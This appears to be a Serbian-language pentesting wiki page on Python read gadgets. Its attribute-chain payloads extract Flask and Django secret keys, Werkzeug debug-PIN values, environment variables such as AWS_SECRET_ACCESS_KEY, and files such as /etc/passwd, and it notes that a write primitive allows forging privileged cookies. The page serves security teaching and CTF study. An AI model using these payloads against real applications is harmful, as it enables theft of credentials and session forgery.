# Gadget-i za interno čitanje u Python-u

## Osnovne informacije

Različite ranjivosti, kao što su [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) ili [**Class Pollution**](class-pollution-pythons-prototype-pollution.md), mogu vam omogućiti da **čitate interne podatke Python-a, ali vam neće omogućiti izvršavanje koda**. Zbog toga će pentester morati da maksimalno iskoristi ove dozvole za čitanje kako bi **dobio osetljive privilegije i eskalirao ranjivost**.

### Flask - Čitanje secret key-a

Glavna stranica Flask aplikacije verovatno će imati globalni objekat **`app`** u kojem je **secret konfigurisan**.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
U ovom slučaju moguće je pristupiti ovom objektu koristeći bilo koji gadget za **pristup globalnim objektima** sa stranice [**Bypass Python sandboxes**](bypass-python-sandboxes/index.html).

U slučaju kada se **vulnerability nalazi u drugom Python fajlu**, potreban vam je gadget za prolazak kroz fajlove kako biste došli do glavnog fajla, **pristupili globalnom objektu `app.secret_key`** i mogli da [**eskalirate privilegije** poznavajući ovaj ključ](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Payload poput ovog [iz ovog writeup-a](https://ctftime.org/writeup/36082):<sup>[[3]](#references)</sup>
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Koristite ovaj payload da biste **pročitali `app.secret_key`**. Ako originalni bug takođe omogućava write primitive (na primer, class pollution), isti put može da se koristi za njegovu zamenu i potpisivanje privilegovanijih Flask cookies.

### Werkzeug - machine_id i node uuid

[**Pomoću ovih payload-a iz ovog writeup-a**](https://vozec.fr/writeups/tweedle-dum-dee/) moći ćete da pristupite **machine_id** i **uuid** node-u, odnosno **privatnim bitovima** koji su vam potrebni da [**generišete Werkzeug pin**](../../network-services-pentesting/pentesting-web/werkzeug.md) i pristupite python konzoli na `/console` ako je **debug mode omogućen**:<sup>[[4]](#references)</sup>
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Imajte na umu da možete dobiti **lokalnu putanju servera do `app.py`** generisanjem neke **greške** na web stranici koja će vam **dati putanju**.

Ako se ranjivost nalazi u drugom Python fajlu, proverite prethodni Flask trik za pristup objektima iz glavnog Python fajla.

### Django - SECRET_KEY i settings module

Django settings objekat se kešira u `sys.modules` čim se aplikacija pokrene. Pomoću samo read primitives možete doći do **`SECRET_KEY`**, rezervnih ključeva, kredencijala baze podataka ili signing salts:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
Ako se ranjivi gadget nalazi u drugom modulu, prvo prođite kroz globals:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS` su jednako vredni kao i trenutni `SECRET_KEY`: i dalje validiraju stare potpisane vrednosti tokom rotacije.<sup>[[1]](#references)</sup> Takođe leakuj `SESSION_ENGINE` i `SESSION_SERIALIZER` da bi brzo utvrdio da li je uticaj ograničen samo na falsifikovanje kolačića ili je nešto ozbiljnije. Za detalje o uticaju na web, pogledaj [**Django pentesting stranicu**](../../network-services-pentesting/pentesting-web/django.md).

### Gadget-i učitavača modula - čitanje izvornog koda i datoteka

Učitani Python moduli obično zadržavaju `__loader__`. Učitavači zasnovani na datotekama često izlažu `get_source()` i `get_data()`, što su savršeni **primitivi samo za čitanje** kada već možeš da dođeš do objekta modula, ali ne i do `open()`:
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
Ovo je veoma korisno za dump **config modules, blueprints, helper files ili hidden routes** i otkrivanje API keys, DSNs, flag paths ili dodatnih gadget entry points.

Ako imate samo subclass enumeration, pretražite loader po imenu umesto hard-coding indeksa:
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Globals generator/coroutine frame-a

Ako možete da kreirate ili dođete do generator/coroutine objekta, njegov frame može da leak-uje globale **bez potrebe za bilo kakvim `__globals__` gadgetom funkcije**. Ovo je korisno protiv filtera koji blokiraju samo dunder imena i zanemaruju frame atribute kao što su `gi_frame`, `ag_frame`, `cr_frame` ili `f_globals`:
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
Kada dođete do frame globals, nastavite tačno kao kod drugih gadgets (`sys.modules`, settings objekti, `os.environ`, itd.). Noviji sandbox escapes stalno ponovo otkrivaju ovo zato što `gi_frame` i `f_globals` nisu dunder attributes i često prežive naivne deny-liste.

### Varijable okruženja / cloud kredencijali putem učitanih modula

Mnogi jail-ovi i dalje importuju `os` ili `sys` na nekom mestu. Možete zloupotrebiti bilo koju dostupnu funkciju `__init__.__globals__` da biste izvršili pivot ka već importovanom `os` modulu i dump-ovali **varijable okruženja** koje sadrže API tokene, cloud ključeve ili flag-ove:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Ako je indeks podklase filtriran, koristite učitavače:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Promenljive okruženja su često jedine tajne potrebne za prelazak sa read na potpunu kompromitaciju (cloud IAM ključevi, URL-ovi baza podataka, ključevi za potpisivanje itd.).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), pogođene verzije `<0.61.0`) je omogućavao **class pollution** putem posebno kreiranih zahteva komponenti. Putanja svojstva kao što je `__init__.__globals__` mogla je da dosegne globale modula komponente i uvezene module; savet za bezbednost demonstrira prepisivanje Django-ovog `SECRET_KEY` i vrednosti u `os.environ`, umesto exploit-a koji omogućava samo čitanje.<sup>[[5]](#references)</sup> Ako zasebna greška omogućava read pristup istom grafu objekata, ti globali mogu otkriti konfiguraciju i kredencijale bez potrebe za izvršavanjem koda.

### Kolekcije gadgeta za chaining

Nedavni CTF-ovi i istraživanja pyjail tehnika pokazuju pouzdane read lance izgrađene isključivo pomoću pristupa atributima i enumeracije podklasa. Liste koje održava zajednica, kao što je [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker), katalogizuju stotine minimalnih gadgeta koje možete kombinovati za kretanje od objekata do `__globals__`, `sys.modules` i, na kraju, osetljivih podataka.<sup>[[2]](#references)</sup> Dajte prednost pretragama zasnovanim na atributima/nazivima u odnosu na direktne indekse podklasa, jer se pozicija objekata `os._wrap_close`, `FileLoader`, `warnings.catch_warnings` itd. menja između verzija Python-a i sa dodatnim uvezenim bibliotekama.

## References

- [1] [Django dokumentacija za kriptografsko potpisivanje](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [2] [pyjailbreaker – wiki o Python sandbox gadgetima](https://github.com/jailctf/pyjailbreaker)
- [3] [CTFtime.org / idekCTF 2022 / task manager / Writeup](https://ctftime.org/writeup/36082)
- [4] [Tweedle Dum & Dee – FCSC 2023 writeup](https://vozec.fr/writeups/tweedle-dum-dee/)
- [5] [Django-Unicorn ranjivost Class Pollution, koja dovodi do RCE, XSS, DoS i Authentication Bypass (GHSA-g9wf-5777-gq43)](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)
{{#include ../../banners/hacktricks-training.md}}
